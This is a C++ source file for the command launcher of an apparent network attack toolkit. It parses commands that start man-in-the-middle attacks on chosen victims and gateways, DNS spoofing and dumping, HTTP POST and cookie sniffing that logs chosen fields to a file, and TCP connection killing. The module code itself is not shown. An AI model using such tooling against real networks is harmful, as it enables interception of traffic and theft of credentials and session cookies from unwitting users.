#include "Launcher.hh"

Launcher::Launcher(void) : _run(false), _core("wlan0")
{
    // Commands
    _commands["help"] = &Launcher::help;
    _commands["exit"] = &Launcher::exit;
    _commands["start"] = &Launcher::start;
    _commands["stop"] = &Launcher::stop;
    _commands["list"] = &Launcher::list;
    _commands["ps"] = &Launcher::ps;

    // Modules
    _commands["startmitm"] = &Launcher::startMitm;
    _commands["startdnsspoof"] = &Launcher::startDnsSpoof;
    _commands["startdnsdump"] = &Launcher::startDnsDump;
    _commands["starthttppostsniffer"] = &Launcher::startHttpPostSniffer;
    _commands["starthttpcookiesniffer"] = &Launcher::startHttpCookieSniffer;
    _commands["startmitmglobal"] = &Launcher::startMitmGlobal;
    _commands["starttcpkill"] = &Launcher::startTcpKill;
}

Launcher::~Launcher(void)
{
    for (std::map<std::string, AModule*>::iterator   it = _modules.begin(); it != _modules.end(); ++it)
    {
        delete (*it).second;
    }
}

const std::string Launcher::readCmdLine(const std::string &line)
{
    std::map<std::string, Command>::iterator    it;
    std::string             cmd;
    Command                 fptr;
    std::istringstream      iss(line);

    _rep.str("");
    _rep.clear();
    iss >> cmd;
    it = _commands.find(cmd);
    if (it == _commands.end())
        help(iss);
    else
    {
        fptr = (*it).second;
        (this->*fptr)(iss);
    }
    return _rep.str();
}


/* COMMANDS */
void Launcher::help(std::istringstream &iss)
{
    (void)iss;
    _rep << "Available commands : " << std::endl;
    _rep << "\tstart <module> <instance name> [options] : Start module" << std::endl;
    _rep << "\tstop <instance name> : Stop module" << std::endl;
    _rep << "\tlist : Display availables modules" << std::endl;
    _rep << "\tps : Display started modules" << std::endl;
    _rep << "\thelp : Display this help" << std::endl;
    _rep << "\tquit : Exit";
}

void Launcher::exit(std::istringstream &iss)
{
    (void)iss;
    stopModules();
    _run = false;
    throw Launcher::Stop();
}

void Launcher::start(std::istringstream &iss)
{
    std::map<std::string, Command>::iterator    it;
    std::string     module;
    Command         fptr;

    iss >> module;
    if (module.length())
    {
        it = _commands.find("start" + module);
        if (it == _commands.end())
        {
            list(iss);
            help(iss);
        }
        else
        {
            fptr = (*it).second;
            (this->*fptr)(iss);
        }
    }
    else
        help(iss);
}

void Launcher::stop(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;

    iss >> name;
    if (!name.length())
        help(iss);
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
            _rep << "Module " << name << " doesn't exist !";
        else
        {
            // Stop the module and delete it
            (*it).second->stop();
            delete (*it).second;
            _modules.erase(name);
            _rep << "Module " << name << " successfully stopped";
        }
    }
}

void Launcher::list(std::istringstream &iss)
{
    (void)iss;
    _rep << "Availables modules : mitm mitmglobal dnsspoof dnsdump httppostsniffer httpcookiesniffer tcpkill";
}

void Launcher::ps(std::istringstream &iss)
{
    (void)iss;
    if (_modules.size())
    {
        for (std::map<std::string, AModule*>::iterator   it = _modules.begin(); it != _modules.end(); ++it)
        {
            _rep << "[" << (*it).second->name() << "]" << "\t'" << (*it).first << "'\t: " << (*it).second->info() << std::endl;
        }
    }
    else
    {
        _rep << "No module actually running.";
    }
}

void Launcher::stopModules(void)
{
    for (std::map<std::string, AModule*>::iterator   it = _modules.begin(); it != _modules.end(); ++it)
    {
        _rep << "Stopping module " << (*it).first;
        (*it).second->stop();
    }
}

/* MODULES STARTER */
void Launcher::startMitm(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     victimIp;
    std::string     gatewayIp;

    iss >> name;
    iss >> victimIp;
    iss >> gatewayIp;
    if (!name.length())
        help(iss);
    else if (!victimIp.length() || !gatewayIp.length())
        _rep << "Bad parameters." << std::endl << Mitm::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            _modules[name] = new Mitm(_core, &_rep, victimIp, gatewayIp);
            _modules[name]->start();
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startDnsSpoof(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     hostfile;

    iss >> name;
    iss >> hostfile;
    if (!name.length())
        help(iss);
    else if (!hostfile.length())
        _rep << "Bad parameters." << std::endl << DnsSpoof::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            _modules[name] = new DnsSpoof(_core, &_rep, hostfile, _core.interface().name());
            _modules[name]->start();
            _rep << "DnsSpoof started : hostfile=" + hostfile;
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startDnsDump(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     file;

    iss >> name;
    iss >> file;
    if (!name.length())
        help(iss);
    else if (!file.length())
        _rep << "Bad parameters." << std::endl << DnsDump::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            std::ofstream    *fd = new std::ofstream();

            fd->open(file); // Close fd ? Where ?
            _modules[name] = new DnsDump(_core, fd, file);
            _modules[name]->start();
            _rep << "DnsDump started : file=" + file;
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startHttpPostSniffer(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator   it;
    std::string                                 name;
    std::string                                 filename;
    std::string                                 key;
    std::vector<std::string>                    vKeys;

    iss >> name;
    iss >> filename;
    iss >> key;
    if (!name.length())
        help(iss);
    else if (!filename.length() || !key.length())
        _rep << "Bad parameters." << std::endl << HttpPostSniffer::help() << std::endl;
    else
    {
        // Push first key and then other keys
        vKeys.push_back(key);
        while (iss >> key)
        {
            vKeys.push_back(key);
        }

        it = _modules.find(name);
        if (it == _modules.end())
        {
            std::ofstream    *fd = new std::ofstream();

            fd->open(filename);
            _modules[name] = new HttpPostSniffer(_core, fd, filename, vKeys);
            _modules[name]->start();
            _rep << "HttpPostSniffer started";
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startHttpCookieSniffer(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator   it;
    std::string                                 name;
    std::string                                 filename;
    std::string                                 key;
    std::vector<std::string>                    vKeys;

    iss >> name;
    iss >> filename;
    iss >> key;
    if (!name.length())
        help(iss);
    else if (!filename.length() || !key.length())
        _rep << "Bad parameters." << std::endl << HttpCookieSniffer::help() << std::endl;
    else
    {
        // Push first key and then other keys (key = cookie name)
        vKeys.push_back(key);
        while (iss >> key)
        {
            vKeys.push_back(key);
        }

        it = _modules.find(name);
        if (it == _modules.end())
        {
            std::ofstream    *fd = new std::ofstream();

            fd->open(filename);
            _modules[name] = new HttpCookieSniffer(_core, fd, filename, vKeys);
            _modules[name]->start();
            _rep << "HttpCookieSniffer started";
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startMitmGlobal(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     gatewayIp;
    std::string     file;

    iss >> name;
    iss >> file;
    iss >> gatewayIp;
    if (!name.length())
        help(iss);
    else if (!gatewayIp.length() || !file.length())
        _rep << "Bad parameters." << std::endl << MitmGlobal::help();
    else
    {
        std::ifstream               fd;
        std::vector<std::string>    victims;

        fd.open(file);
        int i = 0;
        for (std::string line; std::getline(fd, line) && i < 40;i++)
        {
            victims.push_back(line);
        }

        it = _modules.find(name);
        if (it == _modules.end())
        {
            _modules[name] = new MitmGlobal(_core, &_rep, victims, gatewayIp);
            _modules[name]->start();
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}

void Launcher::startTcpKill(std::istringstream &iss)
{
    std::map<std::string, AModule*>::iterator    it;
    std::string     name;
    std::string     dstIp;
    std::string     srcIp;
    std::string     port;

    iss >> name;
    iss >> dstIp;
    iss >> srcIp;
    iss >> port;
    if (!name.length())
        help(iss);
    else if (!dstIp.length() || !port.length() || !srcIp.length())
        _rep << "Bad parameters." << std::endl << TcpKill::help();
    else
    {
        it = _modules.find(name);
        if (it == _modules.end())
        {
            if (dstIp == "0.0.0.0")
            {
                std::cout << srcIp << std::endl;
                _modules[name] = new TcpKill(_core, &_rep, srcIp, port, true);
            }
            else if (srcIp == "0.0.0.0")
            {
                _modules[name] = new TcpKill(_core, &_rep, dstIp, port);
            }
            else
            {
                _modules[name] = new TcpKill(_core, &_rep, dstIp, srcIp, port);
            }
            _modules[name]->start();
        }
        else
        {
            _rep << "Module " << name << " already exist !";
        }
    }
}












